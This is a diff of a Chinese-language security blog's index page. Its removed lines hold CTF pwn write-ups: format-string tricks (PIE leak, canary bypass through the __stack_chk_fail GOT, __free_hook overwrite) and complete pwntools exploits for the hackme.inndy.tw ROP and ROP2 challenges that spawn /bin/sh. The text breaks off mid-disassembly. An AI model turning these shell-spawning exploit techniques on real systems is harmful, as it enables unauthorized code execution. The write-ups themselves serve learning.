-          <h1 id="Format-String-花式玩法"><a href="#Format-String-花式玩法" class="headerlink" title="Format String 花式玩法"></a>Format String 花式玩法</h1><h2 id="1-解決PIE"><a href="#1-解決PIE" class="headerlink" title="1. 解決PIE"></a>1. 解決PIE</h2><h3 id="Stack-Memory-Layout"><a href="#Stack-Memory-Layout" class="headerlink" title="Stack Memory Layout"></a>Stack Memory Layout</h3><p>Stack的分布大致上是:</p>
-<p>==========================</p>
-<pre><code> Enviorment Varibles</code></pre>
-<p>rsp===&gt;(data)<br>       (data)<br>       (data)<br>        Stack Canary<br>rbp===&gt;(data)<br>        Saved RBP<br>        return address</p>
-<p>==========================</p>
-<h3 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h3><p>因此可以構造 <code>%(order)$p</code> 的Payload去 Leak Return Address</p>
-<p>然後將<code>__libc_start_main</code>的offset減掉之後，做後續的ROP</p>
-<p>p.s. RBP之下的東西會先經過shared library再到Heap</p>
-<h2 id="2-繞過Canary"><a href="#2-繞過Canary" class="headerlink" title="2. 繞過Canary"></a>2. 繞過Canary</h2><h3 id="Stack-Memory-Layout-1"><a href="#Stack-Memory-Layout-1" class="headerlink" title="Stack Memory Layout"></a>Stack Memory Layout</h3><p>==========================</p>
-<pre><code> Enviorment Varibles</code></pre>
-<p>rsp===&gt;(data)<br>       (data)<br>       (data)<br>        Stack Canary<br>rbp===&gt;(data)<br>        Saved RBP<br>        return address</p>
-<p>==========================</p>
-<h3 id="solution"><a href="#solution" class="headerlink" title="solution"></a>solution</h3><p>關於Canary的小知識:啟用Canary保護的程式會有<code>__stack_chk_fail</code>函數，因此可以構造payload:</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload = fmtstr_payload(offset, &#123;elf.got[<span class="string">&#x27;__stack_chk_fail&#x27;</span>] : $gadget_addr&#125;) </span><br><span class="line">payload = payload.ljust($stack_size+<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += struct.pack(<span class="string">&quot;&lt;Q&quot;</span>, $PC)</span><br></pre></td></tr></table></figure>
-
-<p>其中gadget_addr指向<code>ret</code> gadget, 這樣跳轉到<code>__stack_chk_fail</code>之後就會直接回到main執行<code>leave; ret</code>了</p>
-<p>最後在<code>ret</code>時會直接踩上覆蓋的return address, 直接control PC</p>
-<h2 id="3-搭配Heap組合技"><a href="#3-搭配Heap組合技" class="headerlink" title="3. 搭配Heap組合技"></a>3. 搭配Heap組合技</h2><h3 id="小知識"><a href="#小知識" class="headerlink" title="小知識"></a>小知識</h3><p>在需要輸出的字串過大時(&gt;100000), 會用Heap來存放要輸出的東西</p>
-<p>所以可以用<code>%(count)c</code>構造payload: <code>%100000c</code>產生長度夠的字串</p>
-<p>然後把<code>__free_hook</code>或是<code>__malloc_hook</code>的GOT蓋掉, 這樣程式在malloc()/free()時就會去執行我們蓋掉的值</p>
-<h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">libc.symbols[<span class="string">&#x27;one_gadget&#x27;</span>] = libc.address + offset</span><br><span class="line">payload = fmtstr_payload(offset, &#123;libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>] : libc.symbols[<span class="string">&#x27;one_gadget&#x27;</span>]&#125;)</span><br></pre></td></tr></table></figure>
+<li>分配stack空間
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/archives/Function-Prologue-and-Epilogue/#more" rel="contents">
+                閱讀全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -539,10 +391,16 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">發表於</span>
-              
 
-              <time title="創建時間：2020-10-16 21:45:20 / 修改時間：22:06:20" itemprop="dateCreated datePublished" datetime="2020-10-16T21:45:20+08:00">2020-10-16</time>
+              <time title="創建時間：2020-10-16 21:45:20" itemprop="dateCreated datePublished" datetime="2020-10-16T21:45:20+08:00">2020-10-16</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新於</span>
+                <time title="修改時間：2021-01-22 18:57:47" itemprop="dateModified" datetime="2021-01-22T18:57:47+08:00">2021-01-22</time>
+              </span>
 
           
 
@@ -557,43 +415,14 @@
       
           <h1 id="hackme-inndy-tw-ROP-amp-ROP2-pwn"><a href="#hackme-inndy-tw-ROP-amp-ROP2-pwn" class="headerlink" title="hackme.inndy.tw ROP &amp; ROP2 (pwn)"></a>hackme.inndy.tw ROP &amp; ROP2 (pwn)</h1><h2 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h2><h3 id="保護機制"><a href="#保護機制" class="headerlink" title="保護機制"></a>保護機制</h3><p>NX, Partial RELRO</p>
 <h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>32-bit, 靜態編譯</p>
-<h4 id="程式邏輯"><a href="#程式邏輯" class="headerlink" title="程式邏輯"></a>程式邏輯</h4><p>這題直接看組語便可解:</p>
-<h5 id="main"><a href="#main" class="headerlink" title="main"></a>main</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">┌ 48: int main (int32_t arg_4h);</span><br><span class="line">│           ; var int32_t var_4h @ ebp-0x4</span><br><span class="line">│           ; arg int32_t arg_4h @ esp+0x24</span><br><span class="line">│           0x08048894      8d4c2404       lea ecx, dword [arg_4h]</span><br><span class="line">│           0x08048898      83e4f0         and esp, 0xfffffff0</span><br><span class="line">│           0x0804889b      ff71fc         push dword [ecx - 4]</span><br><span class="line">│           0x0804889e      55             push ebp</span><br><span class="line">│           0x0804889f      89e5           mov ebp, esp</span><br><span class="line">│           0x080488a1      51             push ecx</span><br><span class="line">│           0x080488a2      83ec04         sub esp, 4</span><br><span class="line">│           0x080488a5      83ec0c         sub esp, 0xc</span><br><span class="line">│           0x080488a8      6a1e           push 0x1e                   ; 30</span><br><span class="line">│           0x080488aa      e861400200     call sym.alarm</span><br><span class="line">│           0x080488af      83c410         add esp, 0x10</span><br><span class="line">│           0x080488b2      e8c5ffffff     call sym.overflow</span><br><span class="line">│           0x080488b7      b800000000     mov eax, 0</span><br><span class="line">│           0x080488bc      8b4dfc         mov ecx, dword [var_4h]</span><br><span class="line">│           0x080488bf      c9             leave</span><br><span class="line">│           0x080488c0      8d61fc         lea esp, dword [ecx - 4]</span><br><span class="line">└           0x080488c3      c3             ret</span><br></pre></td></tr></table></figure>
-
-<p>接著追進<code>overflow()</code> :</p>
-<h5 id="overflow"><a href="#overflow" class="headerlink" title="overflow"></a>overflow</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">┌ 24: sym.overflow ();</span><br><span class="line">│           ; var int32_t var_ch @ ebp-0xc</span><br><span class="line">│           0x0804887c      55             push ebp</span><br><span class="line">│           0x0804887d      89e5           mov ebp, esp</span><br><span class="line">│           0x0804887f      83ec18         sub esp, 0x18</span><br><span class="line">│           0x08048882      83ec0c         sub esp, 0xc</span><br><span class="line">│           0x08048885      8d45f4         lea eax, dword [var_ch]</span><br><span class="line">│           0x08048888      50             push eax</span><br><span class="line">│           0x08048889      e842680000     call sym.gets               ; char *gets(char *s)                                                                                      </span><br><span class="line">│           0x0804888e      83c410         add esp, 0x10</span><br><span class="line">│           0x08048891      90             nop</span><br><span class="line">│           0x08048892      c9             leave</span><br><span class="line">└           0x08048893      c3             ret</span><br></pre></td></tr></table></figure>
-
-<p>可以看到由於使用<code>gets()</code>, 造成明顯的overflow</p>
-<h4 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h4><p>由於存在overflow且為靜態編譯, 可以嘗試組ROP chain:</p>
-<p><code>ROPgadget --binary ./rop --ropchain</code></p>
-<h3 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2 </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;hackme.inndy.tw&#x27;</span>, <span class="number">7704</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;A&#x27;</span> * <span class="number">16</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#ROP chain from ROPgadget</span></span><br><span class="line">p = <span class="string">&#x27;&#x27;</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806ecda</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea060</span>) <span class="comment"># @ .data</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080b8016</span>) <span class="comment"># pop eax ; ret</span></span><br><span class="line">p += <span class="string">&#x27;/bin&#x27;</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0805466b</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806ecda</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea064</span>) <span class="comment"># @ .data + 4</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080b8016</span>) <span class="comment"># pop eax ; ret</span></span><br><span class="line">p += <span class="string">&#x27;//sh&#x27;</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0805466b</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806ecda</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080492d3</span>) <span class="comment"># xor eax, eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0805466b</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080481c9</span>) <span class="comment"># pop ebx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea060</span>) <span class="comment"># @ .data</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080de769</span>) <span class="comment"># pop ecx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806ecda</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080492d3</span>) <span class="comment"># xor eax, eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806c943</span>) <span class="comment"># int 0x80</span></span><br><span class="line"></span><br><span class="line">payload += p</span><br><span class="line"></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br><span class="line">r.close()</span><br></pre></td></tr></table></figure>
-
-<h2 id="ROP2"><a href="#ROP2" class="headerlink" title="ROP2"></a>ROP2</h2><h3 id="保護機制-1"><a href="#保護機制-1" class="headerlink" title="保護機制"></a>保護機制</h3><p>NX, Partial RELRO</p>
-<h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p>一樣32-bit, 但是動態編譯, ROPgadget可能不能使用</p>
-<h4 id="程式邏輯-1"><a href="#程式邏輯-1" class="headerlink" title="程式邏輯"></a>程式邏輯</h4><p>首先看看組語:</p>
-<h5 id="main-1"><a href="#main-1" class="headerlink" title="main"></a>main</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">┌ 146: int main (int32_t arg_4h);</span><br><span class="line">│           ; var int32_t var_33h @ ebp-0x33</span><br><span class="line">│           ; var int32_t var_2fh @ ebp-0x2f</span><br><span class="line">│           ; var int32_t var_2bh @ ebp-0x2b</span><br><span class="line">│           ; var int32_t var_27h @ ebp-0x27</span><br><span class="line">│           ; var int32_t var_23h @ ebp-0x23</span><br><span class="line">│           ; var int32_t var_1fh @ ebp-0x1f</span><br><span class="line">│           ; var int32_t var_1bh @ ebp-0x1b</span><br><span class="line">│           ; var int32_t var_17h @ ebp-0x17</span><br><span class="line">│           ; var int32_t var_13h @ ebp-0x13</span><br><span class="line">│           ; var int32_t var_fh @ ebp-0xf</span><br><span class="line">│           ; var int32_t var_bh @ ebp-0xb</span><br><span class="line">│           ; var int32_t var_9h @ ebp-0x9</span><br><span class="line">│           ; var int32_t var_4h @ ebp-0x4</span><br><span class="line">│           ; arg int32_t arg_4h @ esp+0x54</span><br><span class="line">│           0x08048487      8d4c2404       lea ecx, dword [arg_4h]</span><br><span class="line">│           0x0804848b      83e4f0         and esp, 0xfffffff0</span><br><span class="line">│           0x0804848e      ff71fc         push dword [ecx - 4]</span><br><span class="line">│           0x08048491      55             push ebp</span><br><span class="line">│           0x08048492      89e5           mov ebp, esp</span><br><span class="line">│           0x08048494      51             push ecx</span><br><span class="line">│           0x08048495      83ec34         sub esp, 0x34</span><br><span class="line">│           0x08048498      83ec0c         sub esp, 0xc</span><br><span class="line">│           0x0804849b      6a1e           push 0x1e                   ; 30</span><br><span class="line">│           0x0804849d      e85efeffff     call sym.imp.alarm</span><br><span class="line">│           0x080484a2      83c410         add esp, 0x10</span><br><span class="line">│           0x080484a5      c745cd43616e.  mov dword [var_33h], 0x206e6143 ; &#39;Can &#39;</span><br><span class="line">│           0x080484ac      c745d1796f75.  mov dword [var_2fh], 0x20756f79 ; &#39;you &#39;</span><br><span class="line">│           0x080484b3      c745d5736f6c.  mov dword [var_2bh], 0x766c6f73 ; &#39;solv&#39;</span><br><span class="line">│           0x080484ba      c745d9652074.  mov dword [var_27h], 0x68742065 ; &#39;e th&#39;</span><br><span class="line">│           0x080484c1      c745dd69733f.  mov dword [var_23h], 0xa3f7369</span><br><span class="line">│           0x080484c8      c745e1476976.  mov dword [var_1fh], 0x65766947 ; &#39;Give&#39;</span><br><span class="line">│           0x080484cf      c745e5206d65.  mov dword [var_1bh], 0x20656d20 ; &#39; me &#39;</span><br><span class="line">│           0x080484d6      c745e9796f75.  mov dword [var_17h], 0x72756f79 ; &#39;your&#39;</span><br><span class="line">│           0x080484dd      c745ed20726f.  mov dword [var_13h], 0x706f7220 ; &#39; rop&#39;</span><br><span class="line">│           0x080484e4      c745f1636861.  mov dword [var_fh], 0x69616863 ; &#39;chai&#39;</span><br><span class="line">│           0x080484eb      66c745f56e3a   mov word [var_bh], 0x3a6e   ; &#39;n:&#39;</span><br><span class="line">│           0x080484f1      c645f700       mov byte [var_9h], 0</span><br><span class="line">│           0x080484f5      6a2a           push 0x2a                   ; &#39;*&#39; ; 42</span><br><span class="line">│           0x080484f7      8d45cd         lea eax, dword [var_33h]</span><br><span class="line">│           0x080484fa      50             push eax</span><br><span class="line">│           0x080484fb      6a01           push 1                      ; 1</span><br><span class="line">│           0x080484fd      6a04           push 4                      ; 4</span><br><span class="line">│           0x080484ff      e81cfeffff     call sym.imp.syscall</span><br><span class="line">│           0x08048504      83c410         add esp, 0x10</span><br><span class="line">│           0x08048507      e848ffffff     call sym.overflow</span><br><span class="line">│           0x0804850c      b800000000     mov eax, 0</span><br><span class="line">│           0x08048511      8b4dfc         mov ecx, dword [var_4h]</span><br><span class="line">│           0x08048514      c9             leave</span><br><span class="line">│           0x08048515      8d61fc         lea esp, dword [ecx - 4]</span><br><span class="line">└           0x08048518      c3             ret</span><br></pre></td></tr></table></figure>
-
-<p>跟上一題是差不多的邏輯，但多了<code>syscall()</code></p>
-<p>也可以在<code>overflow()</code>找到漏洞</p>
-<h4 id="利用方式-1"><a href="#利用方式-1" class="headerlink" title="利用方式"></a>利用方式</h4><p>由於有syscall, 我們可以構造任意system call, 而且因為是x86, 所以不用找pop gadget</p>
-<p>在binary中找不到<code>/bin/sh</code>, 所以可以先構造syscall把<code>/bin/sh</code>讀到記憶體中, 再想辦法getshell</p>
-<p>想法:</p>
-<ol>
-<li>構造<code>read()</code>把<code>/bin/sh</code>寫到Bss段</li>
-<li>構造<code>execve()</code>執行<code>execve(&amp;Bss, 0, 0)</code></li>
-</ol>
-<h3 id="exploit-1"><a href="#exploit-1" class="headerlink" title="exploit"></a>exploit</h3><p>查一下syscall table可以找到:</p>
-<ol>
-<li>read = 3</li>
-<li>execve = 11</li>
-</ol>
-<p>構造paylaod:</p>
-<ol>
-<li><code>syscall(3, 0, Bss, 8)</code> 然後再跳轉回main</li>
-<li><code>syscall(11, Bss, 0, 0)</code></li>
-</ol>
-<p>exploit:</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> pwnlib.elf</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;hackme.inndy.tw&#x27;</span>, <span class="number">7703</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./rop2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;A&#x27;</span> * <span class="number">16</span> + p32(e.symbols[<span class="string">&#x27;syscall&#x27;</span>]) + p32(e.symbols[<span class="string">&#x27;overflow&#x27;</span>]) + p32(<span class="number">3</span>) + p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(e.bss()) + p32(<span class="number">8</span>) <span class="comment"># syscall(3, 0, Bss, 8)</span></span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.send(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;A&#x27;</span> * <span class="number">16</span> + p32(e.symbols[<span class="string">&#x27;syscall&#x27;</span>]) + p32(e.symbols[<span class="string">&#x27;overflow&#x27;</span>]) + p32(<span class="number">0xb</span>) + p32(e.bss())</span><br><span class="line">payload += p32(<span class="number">0</span>) + p32(<span class="number">0</span>) <span class="comment"># syscall(0xb, &#x27;/bin/sh&#x27;, 0, 0)</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line">p.close()</span><br></pre></td></tr></table></figure>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/archives/hackme-inndy-tw-ROP-Writeup/#more" rel="contents">
+                閱讀全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -643,7 +472,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新於</span>
-                <time title="修改時間：2020-11-29 19:23:10" itemprop="dateModified" datetime="2020-11-29T19:23:10+08:00">2020-11-29</time>
+                <time title="修改時間：2021-01-22 18:56:29" itemprop="dateModified" datetime="2021-01-22T18:56:29+08:00">2021-01-22</time>
               </span>
 
           
@@ -659,36 +488,14 @@
       
           <h1 id="hackme-inndy-tw-onepunch-pwn"><a href="#hackme-inndy-tw-onepunch-pwn" class="headerlink" title="hackme.inndy.tw onepunch (pwn)"></a>hackme.inndy.tw onepunch (pwn)</h1><h2 id="challenge"><a href="#challenge" class="headerlink" title="challenge"></a>challenge</h2><p><code>nc hackme.inndy.tw 7718</code></p>
 <p>Punch!</p>
-<h2 id="保護機制"><a href="#保護機制" class="headerlink" title="保護機制"></a>保護機制</h2><p>Partial RELRO, NX, Canary</p>
-<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><h3 id="程式邏輯"><a href="#程式邏輯" class="headerlink" title="程式邏輯"></a>程式邏輯</h3><p>main:</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  _BYTE *v6; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v7; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setbuf(_bss_start, <span class="number">0L</span>L);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Where What?&quot;</span>, <span class="number">0L</span>L);</span><br><span class="line">  v5 = __isoc99_scanf(<span class="string">&quot;%llx %d&quot;</span>, &amp;v6, &amp;v4);</span><br><span class="line">  <span class="keyword">if</span> ( v5 != <span class="number">2</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  *v6 = v4;</span><br><span class="line">  <span class="keyword">if</span> ( v4 == <span class="number">255</span> )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;No flag for you&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>先是讀一個pointer和int, 接著把pointer指向的地方改成輸入的數字</p>
-<p>因此我們拿到了一個Arbitrary Write, 但只有一次</p>
-<p>先補一下assembly code:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">156: int main (int argc, char **argv, char **envp);</span><br><span class="line">│           ; var int64_t var_18h @ rbp-0x18</span><br><span class="line">│           ; var uint32_t var_14h @ rbp-0x14</span><br><span class="line">│           ; var int64_t var_10h @ rbp-0x10</span><br><span class="line">│           ; var int64_t canary @ rbp-0x8</span><br><span class="line">│           0x004006f2      55             push rbp</span><br><span class="line">│           0x004006f3      4889e5         mov rbp, rsp</span><br><span class="line">│           0x004006f6      4883ec20       sub rsp, 0x20</span><br><span class="line">│           0x004006fa      64488b042528.  mov rax, 